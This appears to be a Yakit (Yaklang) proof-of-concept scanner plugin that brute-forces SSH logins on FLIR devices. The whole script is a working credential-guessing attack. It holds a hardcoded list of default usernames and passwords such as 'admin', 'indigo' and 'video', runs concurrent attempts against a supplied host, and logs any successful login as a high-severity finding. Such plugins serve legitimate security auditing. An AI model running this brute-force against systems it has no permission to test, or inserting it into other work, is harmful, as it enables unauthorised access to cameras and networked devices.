##server:flir
##type:poc
##params:root_url
##name:FLIR_SSH_weak_password_poc
##severity:high
##out_put:FLIR_SSH_username,FLIR_SSH_password

yakit.AutoInitYakit()
log.setLevel("info")
ssh_username=[
    "admin",
    "ftp",
    "root"
    ]
ssh_password=[
    "admin",
    "admin123",
    "hello",
    "indigo",
    "password",
    "root",
    "video",
    "123456",
    "666666",
    "88888888"
    ]


poc=func(addr){
    log.info("准备ssh爆破")

    ssh_brute,err=brute.New("ssh", 
    brute.userList(ssh_username...), 
    brute.passList(ssh_password...), 
    brute.debug(true), 
    brute.okToStop(true), 
    brute.concurrentTarget(200), 
    brute.concurrent(1), 
    brute.minDelay(1), 
    brute.maxDelay(1), )
    if err != nil {
        die(err)
    }

    log.info("开始ssh爆破")

    res,err=ssh_brute.Start(addr)
    if err != nil {
        die(err)
    }

    for sub_res in res{
        // desc(sub_res)
        // println(sub_res.Ok)
        if sub_res==nil{
            continue
        }
        if !sub_res.Ok{
            continue
        }
        // println(sub_res.Target)
        risk.NewRisk(
        f"ssh://${addr}", risk.severity("high"), 
        risk.title(f"FOUND ${root_url}中存在ssh弱口令漏洞"),
        risk.titleVerbose("ssh弱口令漏洞"),
        risk.type("身份伪造"), risk.typeVerbose("配置错误"),
        risk.details({
            "FLIR_SSH_username": sub_res.Username, 
            "FLIR_SSH_password": sub_res.Password,
        }),
        )    
    }
}




root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
poc(addr)
